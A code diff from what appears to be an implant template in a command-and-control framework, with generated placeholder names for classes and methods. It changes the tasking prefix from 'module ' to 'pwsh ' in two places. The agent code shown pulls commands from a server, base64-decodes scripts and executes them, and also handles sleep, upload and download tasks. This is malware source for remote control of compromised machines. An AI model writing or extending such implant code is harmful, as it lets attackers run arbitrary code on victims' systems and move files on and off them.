@@ -921,13 +921,13 @@ class {class_name}:
                 if interactive_data and interactive_data.get('command'):
                     command = interactive_data['command']
                     task_id = interactive_data['task_id']
-                    if command.startswith('module '):
+                    if command.startswith('pwsh '):
                         try:
-                            encoded_script = command[7:]  # Remove "module " prefix
+                            encoded_script = command[5:]  # Remove "pwsh " prefix
                             decoded_script = base64.b64decode(encoded_script).decode('utf-8')
                             result = self.{m_exec}(decoded_script)
                         except Exception as e:
-                            result = f"[ERROR] Failed to decode and execute module: {{str(e)}}"
+                            result = f"[ERROR] Failed to decode and execute pwsh: {{str(e)}}"
                     elif command.startswith('sleep '):
                         try:
                             parts = command.split(' ', 1)
@@ -1038,13 +1038,13 @@ class {class_name}:
                             command = task.get('command', '')
                             task_id = task.get('id', 'unknown')
 
-                            if command.startswith('module '):
+                            if command.startswith('pwsh '):
                                 try:
-                                    encoded_script = command[7:]  # Remove "module " prefix
+                                    encoded_script = command[5:]  # Remove "pwsh " prefix
                                     decoded_script = base64.b64decode(encoded_script).decode('utf-8')
                                     result = self.{m_exec}(decoded_script)
                                 except Exception as e:
-                                    result = f"[ERROR] Failed to decode and execute module: {{str(e)}}"
+                                    result = f"[ERROR] Failed to decode and execute pwsh: {{str(e)}}"
                             elif command.startswith('upload '):
                                 result = self.{m_handle_upload}(command)
                             elif command.startswith('download '):
